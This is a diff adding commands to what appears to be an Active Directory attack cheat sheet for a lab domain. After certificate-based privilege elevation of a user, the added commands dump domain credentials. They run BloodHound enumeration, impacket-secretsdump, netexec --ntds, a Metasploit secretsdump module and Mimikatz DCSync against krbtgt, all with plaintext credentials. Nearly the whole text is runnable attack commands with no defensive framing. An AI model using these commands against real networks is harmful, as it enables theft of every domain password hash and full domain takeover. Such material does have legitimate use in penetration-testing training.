@@ -175,4 +175,23 @@ certipy-ad cert -pfx administrator.pfx -nocert -out "user.key"
 
 #pass the extracted cert to dc for modify user object.
 ./passthecert.py -action modify_user -crt user.crt -key user.key -domain "ignite.local" -dc-ip 192.168.1.48 -target aarti -elevate
+
+#Emunerate if compromised account have replication permission.
+bloodhound-python -u aarti -p Password@1 -ns 192.168.1.48 -d ignite.local -c All
+
+#exploit using secretsdump:
+impacket-secretsdump 'ignite.local'/'aarti':'Password@1'@'192.168.1.48'
+
+#Netexec validate permissions
+nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds
+nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds --user administrator
+
+
+#metasploit 
+msfconsole -x "use auxiliary/scanner/smb/impacket/secretsdump; set RHOSTS 192.168.1.48; set SMBUser aarti; set SMBPass Password@1; run"
+
+#using Mimikatz
+privilege::debug
+lsadump::dcsync /user:<target_user>
+lsadump::dcsync /domain:ignite.local /user:krbtgt
 ```
